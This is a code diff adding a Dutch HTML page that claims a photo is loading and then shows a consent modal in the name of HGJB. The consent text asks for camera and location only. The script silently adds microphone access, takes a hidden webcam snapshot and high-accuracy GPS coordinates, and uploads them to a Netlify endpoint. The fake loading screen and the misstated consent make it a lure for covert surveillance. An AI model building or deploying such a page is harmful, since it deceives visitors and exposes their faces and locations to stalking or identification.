@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="nl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Bezig met laden…</title>
+<style>
+  :root { --bg:#fff; --fg:#111; --muted:#6b7280; --primary:#111; --border:#e5e7eb; }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--fg)}
+  .center{min-height:100dvh;display:grid;place-items:center;padding:24px}
+  .card{width:100%;max-width:560px;border:1px solid var(--border);border-radius:16px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,.06)}
+  h1{font-size:1.25rem;margin:0 0 .25rem}
+  p{margin:.5rem 0;color:var(--muted);line-height:1.5}
+  button{appearance:none;border:1px solid var(--fg);background:var(--fg);color:#fff;padding:12px 16px;border-radius:10px;font-weight:600;cursor:pointer}
+  button[disabled]{opacity:.6;cursor:not-allowed}
+  .link{color:var(--fg);text-decoration:underline;cursor:pointer}
+  .row{display:flex;gap:10px;align-items:center}
+  ul{margin:.5rem 0 0 1rem;color:var(--muted)}
+  /* loader */
+  .loader{width:36px;height:36px;border:3px solid var(--border);border-top-color:var(--fg);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  /* modal */
+  .backdrop{position:fixed;inset:0;background:rgba(0,0,0,.4);display:none;align-items:center;justify-content:center;padding:16px}
+  .backdrop.show{display:flex}
+  /* hide video; we gebruiken het alleen voor snapshot */
+  video{display:none}
+  pre{display:none}
+  small{color:var(--muted)}
+</style>
+</head>
+<body>
+
+<div class="center" id="loadingView">
+  <div class="card" aria-busy="true">
+    <div class="loader" role="status" aria-label="Bezig met voorbereiden"></div>
+    <h1>Bezig met voorbereiden…</h1>
+    <p>De foto wordt geladen. Een ogenblikje alsjeblieft.</p>
+  </div>
+</div>
+
+<div class="backdrop" id="consentBackdrop" aria-modal="true" role="dialog" aria-labelledby="consentTitle">
+  <div class="card" style="max-width:640px">
+    <h1 id="consentTitle">Toestemming gevraagd</h1>
+    <p>HGJB geeft om je privacy en gaan er verantwoord mee om. Geeft u toestemming voor het volgende?</p>
+    <ul>
+      <li>Toegang tot <strong>camera</strong>
+      <li>Toegang tot <strong>locatie</strong> 
+    </ul>
+    <p><small>Je browser toont hierna de standaard vragen “Sta toe…”. Je kunt dit altijd weigeren.</small></p>
+    <div class="row" style="margin-top:10px">
+      <button id="consentBtn">Ik ga akkoord en geef toestemming</button>
+      <span class="link" id="moreInfo">Meer info</span>
+    </div>
+  </div>
+</div>
+
+<!-- onzichtbare elementen voor het maken van snapshot -->
+<video id="video" autoplay playsinline></video>
+
+<script>
+const loadingView = document.getElementById('loadingView');
+const consentBackdrop = document.getElementById('consentBackdrop');
+const consentBtn = document.getElementById('consentBtn');
+const moreInfo = document.getElementById('moreInfo');
+const video = document.getElementById('video');
+
+let mediaStream = null;
+let currentCoords = null;
+let micLevel = 0;
+
+function showConsentAfterFakeLoad() {
+  // Simuleer kort laden voor een nette flow (geen misleiding over doel)
+  setTimeout(() => {
+    loadingView.style.display = 'none';
+    consentBackdrop.classList.add('show');
+  }, 900); // ~1 seconde
+}
+
+moreInfo.onclick = () => {
+  alert(
+`Waarom vragen we dit?
+• Camera: we maken één stilstaand beeld om te verifiëren.
+• Locatie: we registreren coördinaten voor verificatie.
+
+We slaan data alleen op voor het genoemde doel en niet langer dan noodzakelijk.`
+  );
+};
+
+async function askPermissions() {
+  try {
+    // Camera + microfoon
+    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = mediaStream;
+
+    // Mic level meten (zonder audio op te slaan)
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    const src = audioContext.createMediaStreamSource(mediaStream);
+    const analyser = audioContext.createAnalyser();
+    analyser.fftSize = 256;
+    src.connect(analyser);
+    const dataArray = new Uint8Array(analyser.frequencyBinCount);
+
+    function measure() {
+      analyser.getByteTimeDomainData(dataArray);
+      let sum = 0;
+      for (let i = 0; i < dataArray.length; i++) {
+        const v = (dataArray[i] - 128) / 128;
+        sum += v * v;
+      }
+      const rms = Math.sqrt(sum / dataArray.length);
+      micLevel = Math.min(1, rms * 5);
+      requestAnimationFrame(measure);
+    }
+    measure();
+
+    // Locatie
+    if ("geolocation" in navigator) {
+      await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(p => {
+          currentCoords = {
+            latitude: p.coords.latitude,
+            longitude: p.coords.longitude,
+            accuracy: p.coords.accuracy,
+            timestamp: p.timestamp
+          };
+          resolve();
+        }, reject, { enableHighAccuracy: true, timeout: 10000 });
+      });
+    }
+
+    // Snapshot nemen
+    const track = mediaStream.getVideoTracks()[0];
+    const settings = track.getSettings();
+    const canvas = document.createElement('canvas');
+    canvas.width = settings.width || 640;
+    canvas.height = settings.height || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/png');
+
+    // Versturen
+    const payload = {
+      timestamp: Date.now(),
+      location: currentCoords,
+      micLevel,
+      snapshot: dataUrl
+    };
+
+    const resp = await fetch('/.netlify/functions/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    if (resp.ok) {
+      consentBackdrop.classList.remove('show');
+      document.body.innerHTML =
+        '<div class="center"><div class="card"><h1>Bedankt!</h1><p>Je toestemming is verwerkt.</p></div></div>';
+    } else {
+      const t = await resp.text();
+      alert('Kon niet versturen: ' + resp.status + ' — ' + t);
+    }
+
+  } catch (err) {
+    alert('Toestemming geweigerd of fout: ' + err.message);
+    console.error(err);
+  } finally {
+    if (mediaStream) mediaStream.getTracks().forEach(tr => tr.stop());
+  }
+}
+
+consentBtn.addEventListener('click', askPermissions);
+
+// Start “laden” en daarna de duidelijke consent-modal tonen
+showConsentAfterFakeLoad();
+</script>
+</body>
+</html>
